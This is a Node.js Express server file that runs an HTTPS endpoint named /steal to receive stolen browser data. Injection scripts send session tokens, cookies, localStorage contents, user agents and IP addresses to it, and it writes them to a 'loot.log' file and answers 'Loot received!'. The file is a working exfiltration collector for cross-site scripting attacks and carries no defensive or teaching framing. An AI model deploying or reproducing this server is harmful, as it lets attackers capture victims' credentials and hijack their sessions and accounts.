// server.js
const express = require('express');
const fs = require('fs');
const https = require('https');
const path = require('path');
require('dotenv').config();

const app = express();

// Parse JSON bodies
app.use(express.json());

// Also parse URL-encoded bodies (for iframe form submissions)
app.use(express.urlencoded({ extended: true }));

// --- Logging Configuration ---
const LOG_FILE = path.join(__dirname, 'loot.log');

function logSecure(data) {
    const entry = {
        timestamp: new Date().toISOString(),
        ...data
    };
    const line = JSON.stringify(entry) + '\n';
    
    // Write to file synchronously to ensure it's saved even if process crashes
    try {
        fs.appendFileSync(LOG_FILE, line);
    } catch (err) {
        console.error('[LOOT] Error writing to log file:', err);
    }
}

// --- HTTPS Setup ---
const certDir = path.join(__dirname, 'certs');
const certFile = path.join(certDir, 'cert.pem');
const keyFile = path.join(certDir, 'key.pem');

// Generate self-signed certs if they don't exist (for local dev)
if (!fs.existsSync(certDir)) {
    fs.mkdirSync(certDir, { recursive: true });
}

if (!fs.existsSync(certFile) || !fs.existsSync(keyFile)) {
    // Use openssl command in terminal for better certs:
    // openssl req -x509 -newkey rsa:2048 -keyout certs/key.pem -out certs/cert.pem -days 365 -nodes -subj "/CN=localhost"
    // For now, we'll just create empty files so the code doesn't crash locally if you haven't generated them
    fs.writeFileSync(keyFile, '');
    fs.writeFileSync(certFile, '');
}

const httpsOptions = {
    key: fs.readFileSync(keyFile),
    cert: fs.readFileSync(certFile),
};

// --- Routes ---
app.post('/steal', (req, res) => {
    let payload = req.body;

    // If the body has a 'data' field (from some injection scripts), parse it
    if (payload.data && typeof payload.data === 'string') {
        try {
            payload = JSON.parse(payload.data);
        } catch (e) {
            console.error('[LOOT] Failed to parse nested JSON');
        }
    }

    const token = payload.token || '';
    const cookie = payload.cookie || '';
    const localStorageData = payload.localStorageData || '';
    const userAgent = payload.userAgent || req.get('User-Agent') || 'Unknown';
    const url = payload.url || req.originalUrl;
    const ip = req.ip || req.connection.remoteAddress;

    // Log securely
    logSecure({
        action: 'steal',
        token: token,
        cookie: cookie,
        localStorageData: localStorageData,
        ip: ip,
        userAgent: userAgent,
        url: url,
        timestamp: new Date().toISOString()
    });

    res.status(200).json({ message: 'Loot received!' });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('[LOOT] Server Error:', err);
    res.status(500).json({ error: 'Internal Server Error' });
});

// Start HTTPS server
const PORT = process.env.PORT || 3000;
const server = https.createServer(httpsOptions, app);

server.listen(PORT, () => {
    console.log(`HTTPS Server running on https://localhost:${PORT}`);
});

module.exports = app;
